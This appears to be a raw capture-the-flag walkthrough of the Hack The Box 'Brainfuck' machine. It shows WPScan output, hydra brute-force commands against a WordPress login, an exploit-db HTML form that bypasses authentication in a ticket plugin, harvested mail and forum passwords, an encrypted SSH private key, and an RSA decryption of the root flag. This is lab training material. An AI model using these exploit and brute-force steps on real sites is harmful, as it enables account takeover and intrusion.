+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
+
+[!] Title: WordPress 3.7-4.9.4 - Remove localhost Default
+    Reference: https://wpvulndb.com/vulnerabilities/9053
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/804363859602d4050d9a38a21f5a65d9aec18216
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10101
+[i] Fixed in: 4.7.10
+
+[!] Title: WordPress 3.7-4.9.4 - Use Safe Redirect for Login
+    Reference: https://wpvulndb.com/vulnerabilities/9054
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/14bc2c0a6fde0da04b47130707e01df850eedc7e
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10100
+[i] Fixed in: 4.7.10
+
+[!] Title: WordPress 3.7-4.9.4 - Escape Version in Generator Tag
+    Reference: https://wpvulndb.com/vulnerabilities/9055
+    Reference: https://wordpress.org/news/2018/04/wordpress-4-9-5-security-and-maintenance-release/
+    Reference: https://github.com/WordPress/WordPress/commit/31a4369366d6b8ce30045d4c838de2412c77850d
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10102
+[i] Fixed in: 4.7.10
+
+[!] Title: WordPress <= 4.9.6 - Authenticated Arbitrary File Deletion
+    Reference: https://wpvulndb.com/vulnerabilities/9100
+    Reference: https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/
+    Reference: http://blog.vulnspy.com/2018/06/27/Wordpress-4-9-6-Arbitrary-File-Delection-Vulnerbility-Exploit/
+    Reference: https://github.com/WordPress/WordPress/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd
+    Reference: https://wordpress.org/news/2018/07/wordpress-4-9-7-security-and-maintenance-release/
+    Reference: https://www.wordfence.com/blog/2018/07/details-of-an-additional-file-deletion-vulnerability-patched-in-wordpress-4-9-7/
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12895
+[i] Fixed in: 4.7.11
+
+[+] WordPress theme in use: proficient - v1.0.6
+
+[+] Name: proficient - v1.0.6
+ |  Last updated: 2018-02-16T00:00:00.000Z
+ |  Location: https://brainfuck.htb/wp-content/themes/proficient/
+ |  Readme: https://brainfuck.htb/wp-content/themes/proficient/readme.txt
+[!] The version is out of date, the latest version is 1.1.24
+ |  Style URL: https://brainfuck.htb/wp-content/themes/proficient/style.css
+ |  Theme Name: Proficient
+ |  Description: Proficient is a Multipurpose WordPress theme with lots of powerful features, instantly giving a p...
+ |  Author: Specia
+ |  Author URI: https://speciatheme.com/
+
+[+] Detected parent theme: specia - v2.1.1
+
+[+] Name: specia - v2.1.1
+ |  Last updated: 2018-03-26T00:00:00.000Z
+ |  Location: https://brainfuck.htb/wp-content/themes/specia/
+ |  Readme: https://brainfuck.htb/wp-content/themes/specia/readme.txt
+[!] The version is out of date, the latest version is 2.2.27
+ |  Style URL: https://brainfuck.htb/wp-content/themes/specia/style.css
+ |  Theme Name: Specia
+ |  Theme URI: https://speciatheme.com/specia-free-wordpress-theme/
+ |  Description: Specia is a Multipurpose WordPress theme with lots of powerful features, instantly giving a profe...
+ |  Author: Specia
+ |  Author URI: https://speciatheme.com/
+
+[+] Enumerating plugins from passive detection ...
+ | 1 plugin found:
+
+[+] Name: wp-support-plus-responsive-ticket-system - v7.1.3
+ |  Last updated: 2018-08-15T05:44:00.000Z
+ |  Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+ |  Readme: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
+[!] The version is out of date, the latest version is 9.1.0
+[!] Directory listing is enabled: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
+
+[!] Title: WP Support Plus Responsive Ticket System <= 7.1.3 – Authenticated SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/8699
+    Reference: http://lenonleite.com.br/en/blog/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/
+    Reference: https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system
+    Reference: https://www.exploit-db.com/exploits/40939/
+[i] Fixed in: 8.0.0
+
+[!] Title: WP Support Plus Responsive Ticket System <= 8.0.7 - Remote Code Execution (RCE)
+    Reference: https://wpvulndb.com/vulnerabilities/8949
+    Reference: https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system
+[i] Fixed in: 8.0.8
+
+[!] Title: WP Support Plus Responsive Ticket System <= 9.0.2 - Multiple Authenticated SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/9041
+    Reference: https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md
+    Reference: https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131
+[i] Fixed in: 9.0.3
+[+] Starting the password brute forcer
+^CBrute Forcing 'admin' Time: 00:13:38 <          > (27496 / 14344393)  0.19%  ETA: ??:??:??
+  +----+-------+------+----------+
+  | ID | Login | Name | Password |
+  +----+-------+------+----------+
+  |    | admin |      |          |
+  +----+-------+------+----------+
+
+
+BRUTE FORCE LOGIN
+root@kali:~/htb/brainfuck# hydra -S -s 443 -l admin -P /usr/share/wordlists/rockyou.txt brainfuck.htb -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+root@kali:~/htb/brainfuck# hydra -S -s 443 -l osteris -P /usr/share/wordlists/rockyou.txt brainfuck.htb -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+CHECK EXPLOITS FOR WP 4.7.3 version AND WP Support Plus Responsive Ticket System <= 7.1.3 – Authenticated SQL Injection
+root@kali:~/dirsearch# searchsploit WP Support Plus Responsive Ticket System
+--------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                           |  Path
+                                                                                                         | (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------------------- ----------------------------------------
+WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabilities                 | exploits/php/webapps/34589.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalation                   | exploits/php/webapps/41006.txt
+WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection                          | exploits/php/webapps/40939.txt
+
+
+https://www.exploit-db.com/exploits/41006
+
+EDIT SCRIPT
+root@kali:~/htb/brainfuck# cat exploit.html 
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+# Date: 10-01-2017
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: web
+ 
+#1. Description
+
+#You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+#http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+
+#2. Proof of Concept
+
+<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
+	Username: <input type="text" name="username" value="admin">
+	<input type="hidden" name="email" value="orestis@brainfuck.htb">
+	<input type="hidden" name="action" value="loginGuestFacebook">
+	<input type="submit" value="Login">
+</form>
+
+#Then you can go to admin panel.
+
+VISIT EXPLOIT.HTML
+localhost/exploit.html
+
+root@kali:~/htb/brainfuck# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+127.0.0.1 - - [10/Nov/2020 21:14:54] "GET / HTTP/1.1" 200 -
+127.0.0.1 - - [10/Nov/2020 21:15:02] "GET /exploit.html HTTP/1.1" 200 -
+
+REDIRECTS TO
+https://brainfuck.htb/wp-admin/admin-ajax.php
+
+RETURN TO WP SITE AND NOW LOGGED IN AS ADMINISTRATOR
+https://brainfuck.htb/
+
+SMTP SETTINGS HIDE ORESTIS USER EMAIL PASSWORD
+https://brainfuck.htb/wp-admin/options-general.php?page=swpsmtp_settings
+<input name="swpsmtp_smtp_password" value="kHGuERB29DNiNE" type="password">
+
+
+root@kali:~/htb/brainfuck# telnet 10.10.10.17 110
+Trying 10.10.10.17...
+Connected to 10.10.10.17.
+Escape character is '^]'.
++OK Dovecot ready.
+USER orestis
++OK
+PASS kHGuERB29DNiNE
++OK Logged in.
+LIST
++OK 2 messages:
+1 977
+2 514
+.
+RETR 1
++OK 977 octets
+Return-Path: <www-data@brainfuck.htb>
+X-Original-To: orestis@brainfuck.htb
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 33)
+	id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: New WordPress Site
+X-PHP-Originating-Script: 33:class-phpmailer.php
+Date: Mon, 17 Apr 2017 17:15:40 +0000
+From: WordPress <wordpress@brainfuck.htb>
+Message-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>
+X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+
+Your new WordPress site has been successfully set up at:
+
+https://brainfuck.htb
+
+You can log in to the administrator account with the following information:
+
+Username: admin
+Password: The password you chose during the install.
+Log in here: https://brainfuck.htb/wp-login.php
+
+We hope you enjoy your new site. Thanks!
+
+--The WordPress Team
+https://wordpress.org/
+.
+RETR 2
++OK 514 octets
+Return-Path: <root@brainfuck.htb>
+X-Original-To: orestis
+Delivered-To: orestis@brainfuck.htb
+Received: by brainfuck (Postfix, from userid 0)
+	id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+To: orestis@brainfuck.htb
+Subject: Forum Access Details
+Message-Id: <20170429101206.4227420AEB@brainfuck>
+Date: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)
+From: root@brainfuck.htb (root)
+
+Hi there, your credentials for our "secret" forum are below :)
+
+username: orestis
+password: kIEnnfEKJ#9UmdO
+
+Regards
+.
+
+SUPERSECRET FORUM USES VIGNERE CIPHER TEXT
+http://rumkin.com/tools/cipher/vigenere.php
+GET DECRYPT KEY FIRST- USE ORESTIS SIGNATURE
+Orestis - Hacking for fun and profit
+
+PASSPHRASE:orestishackingforfunandprofit
+MESSAGE:Qbqquzs - Pnhekxs dpi fca fhf zdmgzt
+RESULT:Ckmybra - Infuckm ybr ain fuc kmybra
+
+KEY:fuckmybrain
+
+DECRYPT WITH CYBERCHEF
+https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode(%27fuckmybrain%27)&input=TXlhIHF1dGYgZGUgYnVqIG90diBybXMgZHkgc3JkIHZrZG9mIDopCgpQaWVhZ25tIC0gSmtvaWplZyBuYncgend4IG1sZSBncndzbm4KClh1YSB6eGNiamUgaWFpIGMgbGVlciBuemdwZyBpaSB1eS4uLgoKVWZnb3FjYmplLi4uLgoKV2VqbXZzZSAtIEZidGtxYWwgenFiIHJzbyBybmwgY3dpaHNmCgpZYmdicSB3cGwgZ3cgbHRvIHVkZ25qdSBmY3BwLCBDIGp5YmMgemZ1IHpycnlvbHFwIHpmdXogeGpzIHJrZXF4ZnJsIG9qd2NlZWMgSiB1b3ZnIDopCgptbnZ6ZTovLzEwLjEwLjEwLjE3Lzh6YjVyYTEwbTkxNTIxODY5N3ExaDY1OHdmb3EwemM4L2ZybWZ5Y3Uvc3BfcHRyCgpTaSByYmF6bXZtLCBRJ3lxIHZ0ZWZjIGdmcmtyIG5uIDspCgpRYnFxdXpzIC0gUG5oZWt4cyBkcGkgZmNhIGZoZiB6ZG1nenQ
+
+GET SSH KEY
+https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa
+
+CHECK SSH KEY PERMISSIONS
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382
+
+mneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/
+B2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi
+W1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ
+7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ
+zxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum
+oz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem
+dLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+
+Fvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT
+mcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs
+LSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq
+ul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59
+krKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V
+gdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA
+VwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn
+schqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt
+UX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn
+F7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M
+wZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab
+Iql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg/HTCy
+IQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF
+mxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y/i+rDKg8ZNV3TIb5TAqIqQRgZqpP
+CvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF
+9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS
+EBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi
+6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ
+-----END RSA PRIVATE KEY-----
+
+DECRYPT ID_RSA PASSPHRASE
+DECRYPT WITH CYBERCHEF
+
+
+
+LOG IN VIA SSH
+root@kali:~/htb/brainfuck# ssh -i id_rsa orestis@10.10.10.17
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-75-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+You have mail.
+Last login: Wed May  3 19:46:00 2017 from 10.10.11.4
+orestis@brainfuck:~$ id & uname & pwd
+[1] 25979
+[2] 25980
+/home/orestis
+orestis@brainfuck:~$ Linux
+uid=1000(orestis) gid=1000(orestis) groups=1000(orestis),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),121(lpadmin),122(sambashare)
+^C
+[1]-  Done                    id
+[2]+  Done                    uname
+orestis@brainfuck:~$ uname -ar
+Linux brainfuck 4.4.0-75-generic #96-Ubuntu SMP Thu Apr 20 09:56:33 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+orestis@brainfuck:~$ lsb_release -a
+No LSB modules are available.
+Distributor ID:	Ubuntu
+Description:	Ubuntu 16.04.2 LTS
+Release:	16.04
+Codename:	xenial
+orestis@brainfuck:~$ pwd
+/home/orestis
+
+GET USER FLAG
+orestis@brainfuck:~$ cat user.txt 
+###############################
+
+INVESTIGATE FILES RELATED TO RSA DECRYPTION
+orestis@brainfuck:~$ cat output.txt 
+Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+orestis@brainfuck:~$ cat debug.txt 
+7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+orestis@brainfuck:~$ cat encrypt.sage 
+nbits = 1024
+
+password = open("/root/root.txt").read().strip()
+enc_pass = open("output.txt","w")
+debug = open("debug.txt","w")
+m = Integer(int(password.encode('hex'),16))
+
+p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
+n = p*q
+phi = (p-1)*(q-1)
+e = ZZ.random_element(phi)
+while gcd(e, phi) != 1:
+    e = ZZ.random_element(phi)
+
+
+
+c = pow(m, e, n)
+enc_pass.write('Encrypted Password: '+str(c)+'\n')
+debug.write(str(p)+'\n')
+debug.write(str(q)+'\n')
+debug.write(str(e)+'\n')
+
+CREATE RSA DECRYPT SCRIPT
+https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e
+
+orestis@brainfuck:~$ vim decrypt_rsa.py
+
+ADD DEBUG TEXT TO P Q E AND OUPUT TEXT TO CIPHER CT
+    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
+    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
+    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
+
+#   ct = 299604539773691895576847697095098784338054746292313044353582078965
+    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182
+
+GET ROOT FLAG
+orestis@brainfuck:~$ ls -l
+total 72
+-rwxr--r-- 1 orestis orestis 46631 Nov 11 22:01 LinEnum.sh
+-rw------- 1 orestis orestis   619 Apr 29  2017 debug.txt
+-rw-rw-r-- 1 orestis orestis  1663 Nov 11 22:25 decrypt_rsa.py
+-rw-rw-r-- 1 orestis orestis   580 Apr 29  2017 encrypt.sage
+drwx------ 3 orestis orestis  4096 Apr 29  2017 mail
+-rw------- 1 orestis orestis   329 Apr 29  2017 output.txt
+-r-------- 1 orestis orestis    33 Apr 29  2017 user.txt
+orestis@brainfuck:~$ chmod 744 decrypt_rsa.py 
+orestis@brainfuck:~$ python decrypt_rsa.py 
+n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
+pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
+orestis@brainfuck:~$ python -c "print format(24604052029401386049980296953784287079059245867880966944246662849341507003750, 'x').decode('hex')"
+##################################
+
+
+
+
